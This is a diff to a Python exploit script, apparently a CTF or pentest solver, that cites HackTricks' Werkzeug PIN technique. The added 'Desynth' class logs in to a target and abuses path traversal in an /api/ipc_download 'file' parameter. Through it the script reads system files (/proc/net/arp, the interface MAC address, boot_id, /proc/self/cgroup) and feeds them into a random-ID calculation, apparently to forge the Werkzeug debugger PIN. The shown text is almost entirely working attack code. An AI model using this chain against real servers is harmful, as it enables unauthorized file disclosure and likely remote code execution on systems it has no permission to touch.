@@ -1,11 +1,45 @@
 import hashlib
 from itertools import chain
 from typing import Callable
+from typing import Tuple
+import requests
 
 """
 Source: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#pin-protected-path-traversal
 """
 
+class Desynth:
+    def __init__(self, target: str, port: int):
+        self. target = target
+        self. port = port
+        self.session = requests.Session()
+
+    def authenticate(self, username: str, password: str, ) -> requests.Response:
+        payload = {"username": username,"password": password}
+        return self.session.post(f"http://{self.target}:{self.port}/api/login", json=payload)
+
+    def request_file(self, file_path: str) -> str:
+        file_path = file_path[1:] if file_path[0] == "/" else file_path
+        params = {"file": f"../../../../../{file_path}"}
+        response = self.session.get(f"http://{self.target}:{self.port}/api/ipc_download", params=params)
+        return response.text if response.ok else None
+
+    def gather_files(self) -> Tuple[str, str]:
+        arp_file = self.request_file("/proc/net/arp")
+        arp_entries = parse_arp_file(arp_file)
+        # mac_address = parse_mac_address(arp_entries[0].get('hw_address'))
+        device_id = arp_entries[0].get('device')
+        mac_address_hex = self.request_file(f"/sys/class/net/{device_id}/address")
+        mac_address = parse_mac_address(mac_address_hex)
+        boot_id = self.request_file("/proc/sys/kernel/random/boot_id").strip()
+        # machine_id = request_file("/etc/machine-id", session)
+        machine_id = None
+        cgroup_file = self.request_file("/proc/self/cgroup")
+        cgroup = cgroup_file.split('\n')[0].split('/')[-1]
+        random_id = create_random_id(machine_id, boot_id, cgroup)
+        return mac_address, random_id
+    
+    
 def parse_arp_file(file_contents: str) -> str:
     lines = file_contents.split('\n')[1:]
     headers = ['ip_address', 'hw_type', 'flags', 'hw_address', 'mask', 'device']
